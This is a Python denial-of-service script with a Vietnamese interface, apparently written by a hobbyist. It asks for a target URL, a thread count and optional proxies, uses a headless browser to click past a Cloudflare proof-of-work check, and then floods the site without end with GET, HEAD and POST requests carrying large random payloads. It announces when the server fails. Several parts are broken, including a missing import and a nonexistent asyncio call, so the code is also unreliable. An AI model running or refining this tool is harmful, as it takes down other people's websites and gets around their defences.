import requests
import aiohttp
import asyncio
import random
import string
import ssl
from pyppeteer import launch
import os
import time

os.system("clear")
time.sleep(2)

print("\033[92m===================\n|| \033[91mdos \033[94msiêu \033[91mlỏ, \033[0mviết bởi dragoo ||\n\033[92m===================\033[0m\n\n")

url = input("url: ")
time.sleep(3)
print("đang dập")

def generate_random_payload():
    length = random.randint(1, 9999999)
    text_characters = string.ascii_letters + string.digits + string.punctuation
    payload = "".join(random.choice(text_characters) for i in range(length))
    return payload

async def attack(target):
    print("Check...")
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "User-agent": "hello, world!!!",
    }
    while True:
        try:
            x = requests.get(target, headers=headers, params={"payload": generate_random_payload()}, timeout=6)
        except requests.exceptions.RequestException as e:
            print("Error:", e)
        if x is not None and x.status_code == 200:
            session = aiohttp.ClientSession()
            context = ssl.create_default_context()
            async with session.head(target, cookies=x.cookies, ssl=context) as response:
                await response.text()
            test = requests.get(target)
            print("test", test.status_code)
            await asyncio.sleep(0.1)
            requests.post(target, headers=headers, params={"payload": generate_random_payload()})
            rsn = requests.get(target)
            print("status web", rsn)
        elif x is not None and x.status_code == 403:
            print("Block IP!!!")
            break
        elif x is not None and x.status_code >= 500:
            print("Die!!!")
            session = aiohttp.ClientSession()
            async with session.get(target) as response:
                await response.text()
                await response.release()
        if sys.stdin in asyncio.select([sys.stdin], [], [], 0)[0]:
            pass

async def ddgCaptcha(page):
    while True:
        await page.waitForXPath('/html/body/div[1]/div/div[2]/div[4]/div/div[2]/div[1]/main/article/header/div[1]/form/input[1]')
        await asyncio.sleep(1)
        userInput = await page.xpath('/html/body/div[1]/div/div[2]/div[4]/div/div[2]/div[1]/main/article/header/div[1]/form/input[1]')
        await userInput[0].type("voicely")
        searchButton = await page.xpath('/html/body/div[1]/div/div[2]/div[4]/div/div[2]/div[1]/main/article/header/div[1]/form/button')
        await searchButton[0].click()
        time.sleep(0.5)
        await asyncio.sleep(1)

async def ditmemaybypassclouflare(url, proxy_type, proxy_file):
    proxies = []

    if proxy_file and proxy_file != 'none':
        try:
            with open(proxy_file, 'r') as file:
                for line in file:
                    proxies.append(line.strip())
        except FileNotFoundError:
            print("File không tồn tại.")
            return
        except Exception as e:
            print("Error:", e)
            return

    browser = await launch()
    context = await browser.createIncognitoBrowserContext()
    page = await context.newPage()

    if proxy_type != 'none' and proxies:
        proxy = random.choice(proxies)
        proxy_kwargs = {}

        if proxy_type == 'https':
            proxy_kwargs['https'] = proxy
        elif proxy_type == 'socks4':
            proxy_kwargs['socks4'] = proxy
        elif proxy_type == 'socks5':
            proxy_kwargs['socks5'] = proxy

        try:
            await page.goto(url, {"args": ["--proxy-server=" + proxy], "ignoreHTTPSErrors": True})
            cloudflare = await page.evaluate('''() => {
                const button = document.querySelector('.big-button.pow-button');
                if (button) {
                    const { x, y, width, height } = button.getBoundingClientRect();
                    return { x: x + width / 2, y: y + height / 2 };
                } else {
                    return false;
                }
            }''')
            if cloudflare:
                await page.hover('.big-button.pow-button')
                await page.mouse.click(cloudflare['x'], cloudflare['y'])
                await page.waitForTimeout(6000)
            await attack(url)
        except Exception as e:
            print("Error:", e)
        finally:
            await page.close()
            await context.close()
            await browser.close()
    else:
        try:
            await page.goto(url)
            cloudflare = await page.evaluate('''() => {
                const button = document.querySelector('.big-button.pow-button');
                if (button) {
                    const { x, y, width, height } = button.getBoundingClientRect();
                    return { x: x + width / 2, y: y + height / 2 };
                } else {
                    return false;
                }
            }''')
            if cloudflare:
                await page.hover('.big-button.pow-button')
                await page.mouse.click(cloudflare['x'], cloudflare['y'])
                await page.waitForTimeout(6000)
            await attack(url)
        except Exception as e:
            print("Error:", e)
        finally:
            await page.close()
            await context.close()
            await browser.close()

def prompt_proxy_type():
    proxy_type = input("Loại proxy (https/socks4/socks5) hoặc không sử dụng proxy thì enter bỏ qua: ")
    if proxy_type.strip().lower() == 'none':
        return None
    return proxy_type.strip().lower()

def prompt_proxy_file():
    proxy_file = input("Tên file chứa danh sách proxy (nếu có, ghi 'none' nếu không sử dụng proxy): ")
    if proxy_file.strip().lower() == 'none':
        return None
    return proxy_file.strip()

try:
    num_threads = int(input("Số luồng (dùng số luồng nhỏ tránh treo máy): "))
    proxy_type = prompt_proxy_type()
    proxy_file = prompt_proxy_file()

    loop = asyncio.get_event_loop()
    tasks = []
    for _ in range(num_threads):
        task = asyncio.ensure_future(ditmemaybypassclouflare(url, proxy_type, proxy_file))
        tasks.append(task)
    loop.run_until_complete(asyncio.wait(tasks))
except Exception as e:
    print("Error:", e)
